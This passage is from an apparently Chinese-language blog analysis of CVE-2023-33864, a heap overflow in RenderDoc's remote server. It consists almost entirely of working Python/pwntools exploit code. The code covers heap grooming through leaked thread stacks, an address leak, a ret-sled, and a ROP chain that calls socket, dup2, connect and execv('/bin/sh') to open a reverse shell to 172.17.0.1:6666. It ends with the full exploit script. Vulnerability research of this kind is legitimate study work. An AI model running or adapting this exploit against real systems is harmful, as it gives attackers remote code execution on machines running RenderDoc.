<span class="n">heap_addr</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">recv_buf</span><span class="p">[</span><span class="n">tag_index</span><span class="o">+</span><span class="mi">80</span> <span class="p">:</span> <span class="n">tag_index</span><span class="o">+</span><span class="mi">88</span><span class="p">].</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">text_addr</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">recv_buf</span><span class="p">[</span><span class="n">tag_index</span><span class="o">+</span><span class="mi">88</span> <span class="p">:</span> <span class="n">tag_index</span><span class="o">+</span><span class="mi">96</span><span class="p">].</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">libc_addr</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">recv_buf</span><span class="p">[</span><span class="n">tag_index</span><span class="o">+</span><span class="mi">40</span> <span class="p">:</span> <span class="n">tag_index</span><span class="o">+</span><span class="mi">48</span><span class="p">].</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
</code></pre></div></div>

<ol>
  <li>
    <p>再次连进去一个 client ，其中 kick = 0，client name 部分构造 rop 链。</p>

    <p>新的 client name 彻底覆盖了调试线程的栈，我们可以在栈上面大量喷洒 ret 指令的地址，当 19 号线程的某个函数返回的时候就会进入 ret 滑板地址，一直滑到 rop 的反弹shell部分。</p>

    <p>由于堆地址在第 7 步中已经泄漏出来，因此我们很容易定位 “/bin/bash” 字符串的地址。</p>
  </li>
</ol>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/renderdoc-%E7%AC%AC_9_%E9%A1%B5.jpg" alt="renderdoc-第 9 页.jpg" /></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">rop_chain</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">'</span>
<span class="c1">#struct sockaddr_in   172.17.0.1:6666
</span><span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x010011ac0a1a0002</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x0000556b2b358120</span><span class="p">)</span>
    
<span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x26c</span>
<span class="c1"># int fd = socket(AF_INET, SOCK_STREAM, 0);
</span><span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">)</span>
<span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdx_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">socket_addr</span><span class="p">)</span>
<span class="c1"># dup2(7, 0)
</span><span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
<span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">dup2_addr</span><span class="p">)</span>
<span class="c1"># dup2(7, 1)
</span><span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
<span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">dup2_addr</span><span class="p">)</span>
<span class="c1"># dup2(7, 2)
</span><span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
<span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">dup2_addr</span><span class="p">)</span>
<span class="c1"># connect(fd, (struct sockaddr *)&amp;serv_addr, sizeof(serv_addr));
</span><span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
<span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">sockaddr_addr</span><span class="p">)</span>
<span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdx_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
<span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">connect_addr</span><span class="p">)</span>
<span class="c1"># execv("/bin/sh", NULL)
</span><span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span> 
<span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">execv_addr</span><span class="p">)</span>
<span class="n">rop_chain</span><span class="p">.</span><span class="nf">rjust</span><span class="p">(</span><span class="mh">0x900000</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
    
<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="p">)</span>
<span class="n">packet</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x2</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> \
         <span class="nf">p32</span><span class="p">(</span><span class="mh">0x900000</span><span class="p">)</span> <span class="o">+</span> <span class="n">rop_chain</span> <span class="o">+</span> \
         <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x40</span>
             
<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="漏洞利用代码">漏洞利用代码</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
</span>
<span class="c1"># Author: qiutianshu
# Date: 2025/05/21
</span>
<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="n">socket</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="n">sys</span>
<span class="kn">import</span> <span class="n">threading</span>

<span class="n">text_off</span> <span class="o">=</span> <span class="mh">0x8e000</span>
<span class="n">ret_offset</span> <span class="o">=</span> <span class="mh">0x8E01A</span> <span class="o">-</span> <span class="n">text_off</span>
<span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x560a27</span> <span class="o">-</span> <span class="n">text_off</span>
<span class="n">pop_rsi_ret</span> <span class="o">=</span> <span class="mh">0x164dfe</span> <span class="o">-</span> <span class="n">text_off</span>
<span class="n">pop_rdx_ret</span> <span class="o">=</span> <span class="mh">0xe4192</span><span class="o">-</span> <span class="n">text_off</span>
<span class="n">pop_rax_ret</span> <span class="o">=</span> <span class="mh">0x21c987</span> <span class="o">-</span> <span class="n">text_off</span>
<span class="n">pop_rbx_ret</span> <span class="o">=</span> <span class="mh">0x1d73d5</span> <span class="o">-</span> <span class="n">text_off</span>
<span class="n">pop_rcx_ret</span> <span class="o">=</span> <span class="mh">0x2235f2</span> <span class="o">-</span> <span class="n">text_off</span>
<span class="n">xchg_rdi_rax_ret</span> <span class="o">=</span> <span class="mh">0x146eebc</span> <span class="o">-</span> <span class="n">text_off</span>

<span class="k">def</span> <span class="nf">tmp_thread</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
    <span class="n">s</span> <span class="o">=</span> <span class="nf">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    <span class="n">packet</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x2</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x6</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">tmptmp</span><span class="sh">'</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x40</span>
    <span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="k">pass</span>

<span class="k">def</span> <span class="nf">long_live_thread</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
    <span class="n">s</span> <span class="o">=</span> <span class="nf">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    <span class="n">packet</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x2</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span> <span class="o">+</span> \
        <span class="nf">p32</span><span class="p">(</span><span class="mh">0xdee870</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x03</span><span class="sh">'</span> <span class="o">*</span>  <span class="mh">0xdee870</span>
        
    <span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
    <span class="n">packet</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x04</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x80</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="k">pass</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">Usage: </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> &lt;ip&gt; &lt;port&gt;</span><span class="sh">'</span><span class="p">)</span>
        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    
    <span class="n">ip</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
    <span class="n">port</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
    <span class="n">ChunkCallstackFlag</span> <span class="o">=</span> <span class="mh">0x00010000</span>

<span class="c1"># step 1: 制造内存泄露，填补server线程到库文件之间的gap
# 
#     0                                       64M
# ----V----------------------------------------V--------------|-------------
#     |          server thread's heap          |  random gap  |  libraries
# ----|----------------------------------------|--------------|-------------
#
#  建立7个连续的连接, 每个连接会 clone 出一个新的线程，每个线程glibc会分配 8MB + 4KB 的栈空间
#  目的是为了缩小 server thread 堆到库文件映射之间的gap。
#  新的线程因为不满足校验而退出，但源程序没有用到pthread_join，造成了每个线程的 8MB + 4KB 内存泄露
# 
</span>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">15</span><span class="p">):</span>
        <span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">s</span> <span class="o">=</span> <span class="nf">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
        <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
        <span class="n">packet</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x2</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x5</span><span class="p">)</span> <span class="o">+</span> <span class="sa">f</span><span class="sh">'</span><span class="s">root</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="sh">'</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x40</span>
        <span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
        <span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">thread stack leak </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
        
		<span class="c1"># step 2：
</span>    <span class="c1"># ePacket_Handshake | ChunkCallstackFlag
</span>    <span class="c1"># + CallstackSize (实际会分配 CallstackSize x 8 大小的堆块)
</span>    <span class="c1"># + CallstackContent 
</span>    <span class="c1"># + p32(1)   
</span>    <span class="c1"># + clientname 的长度
</span>    <span class="c1"># + clientname  
</span>    <span class="c1"># + p32(0xe)是控制 m_ChunkMetadata.length 字段的
</span>    <span class="n">s</span> <span class="o">=</span> <span class="nf">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    <span class="n">packet</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x2</span> <span class="o">|</span> <span class="n">ChunkCallstackFlag</span><span class="p">)</span> \
            <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x26</span><span class="p">)</span> \
            <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x01\x01\x01\x01\x01\x01\x01\x01</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x26</span> \
            <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0xe</span><span class="p">)</span> \
            <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span> \
            <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x5</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">ts588</span><span class="sh">'</span> \
            <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x02</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">54</span>
    
    <span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
    <span class="c1"># step 3:
</span>    <span class="n">s</span> <span class="o">=</span> <span class="nf">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    <span class="n">packet</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x2</span> <span class="o">|</span> <span class="n">ChunkCallstackFlag</span><span class="p">)</span> \
            <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span> \
            <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\xff</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x200</span> \
            <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span> \
            <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> \
            <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00\x00\x00\x01</span><span class="sh">'</span> \
            <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\xfe</span><span class="sh">'</span> <span class="o">*</span> <span class="p">(</span><span class="mi">16</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mi">1024</span> \
            <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\xfd</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">1024</span> 
    
    <span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
    
    <span class="c1"># 0x90 是溢出边界
</span>    <span class="c1"># 任意控制相邻堆块的 prev_size 字段和 size 字段
</span>    <span class="c1"># packet = b'b' * 0x1000
</span>    <span class="c1"># 0xfffffffffec12000 是 0x13EE000 的负数的补码
</span>    <span class="c1"># glibc mmap的阈值是16MB
</span>    <span class="n">packet</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">b</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x80</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x10050</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x145</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xdeadbeefdeadbeef</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x26</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xfffffffffec12000</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x1bef007</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
    
    <span class="c1"># step 4:
</span>    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">step 4: create a temp thread</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">th_tmp</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">tmp_thread</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    <span class="n">th_tmp</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
    <span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    
    <span class="c1"># step 5:
</span>    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">step 5: create a long-live thread, kick out previous tmp thread</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">th_long_live</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">long_live_thread</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    <span class="n">th_long_live</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
    
    <span class="c1"># step 6: information leak
</span>    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">step 6: leak the content of long-live thread stack</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">s</span> <span class="o">=</span> <span class="nf">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    
    <span class="c1"># do not kick out the long-live thread
</span>    <span class="n">packet</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x2</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span> <span class="o">+</span> \
        <span class="nf">p32</span><span class="p">(</span><span class="mh">0x6</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">qts588</span><span class="sh">'</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x40</span>
        
    <span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
    
    <span class="n">recv_buf</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">''</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">recv_buf</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">2048</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">recv_buf</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x10\x00\x00\x00\x03\x03\x03\x03</span><span class="sh">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
            <span class="k">break</span>
    
    <span class="n">tag_index</span> <span class="o">=</span> <span class="n">recv_buf</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x10\x00\x00\x00\x03\x03\x03\x03</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">heap_addr</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">recv_buf</span><span class="p">[</span><span class="n">tag_index</span><span class="o">+</span><span class="mi">80</span> <span class="p">:</span> <span class="n">tag_index</span><span class="o">+</span><span class="mi">88</span><span class="p">].</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
    <span class="n">text_addr</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">recv_buf</span><span class="p">[</span><span class="n">tag_index</span><span class="o">+</span><span class="mi">88</span> <span class="p">:</span> <span class="n">tag_index</span><span class="o">+</span><span class="mi">96</span><span class="p">].</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
    <span class="n">libc_addr</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">recv_buf</span><span class="p">[</span><span class="n">tag_index</span><span class="o">+</span><span class="mi">40</span> <span class="p">:</span> <span class="n">tag_index</span><span class="o">+</span><span class="mi">48</span><span class="p">].</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
    
    <span class="n">heap_off</span> <span class="o">=</span> <span class="mh">0x7fe0edbff430</span> <span class="o">-</span> <span class="mh">0x7fe0ed400000</span>
    <span class="n">text_off</span> <span class="o">=</span> <span class="mh">0x7fe0f38350d4</span> <span class="o">-</span> <span class="mh">0x7fe0f21f7000</span>
    <span class="n">libc_off</span> <span class="o">=</span> <span class="mh">0x7f00168657af</span> <span class="o">-</span> <span class="mh">0x7f0016767000</span>
    <span class="n">binsh_off</span> <span class="o">=</span> <span class="mh">0x7f8b55bff3d0</span> <span class="o">-</span> <span class="mh">0x7f8b55400000</span>
    
    <span class="n">heap_base</span> <span class="o">=</span> <span class="n">heap_addr</span> <span class="o">-</span> <span class="n">heap_off</span>
    <span class="n">text_base</span> <span class="o">=</span> <span class="n">text_addr</span> <span class="o">-</span> <span class="n">text_off</span>
    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">-</span> <span class="n">libc_off</span>
    
    <span class="n">dup2_addr</span> <span class="o">=</span> <span class="mh">0x10EAE0</span> <span class="o">+</span> <span class="n">libc_base</span> <span class="o">-</span> <span class="mh">0x22000</span>
    <span class="n">execv_addr</span> <span class="o">=</span> <span class="mh">0xE32D0</span> <span class="o">+</span> <span class="n">libc_base</span> <span class="o">-</span> <span class="mh">0x22000</span>
    <span class="n">setsockopt_addr</span> <span class="o">=</span> <span class="mh">0x120960</span> <span class="o">+</span> <span class="n">libc_base</span> <span class="o">-</span> <span class="mh">0x22000</span>
    <span class="n">socket_addr</span> <span class="o">=</span> <span class="mh">0x1209C0</span> <span class="o">+</span> <span class="n">libc_base</span> <span class="o">-</span> <span class="mh">0x22000</span>
    <span class="n">connect_addr</span> <span class="o">=</span> <span class="mh">0x1203B0</span> <span class="o">+</span> <span class="n">libc_base</span> <span class="o">-</span> <span class="mh">0x22000</span>
    <span class="n">ret_addr</span> <span class="o">=</span> <span class="n">ret_offset</span> <span class="o">+</span> <span class="n">text_base</span>
    <span class="n">pop_rdi_ret_addr</span> <span class="o">=</span> <span class="n">pop_rdi_ret</span> <span class="o">+</span> <span class="n">text_base</span>
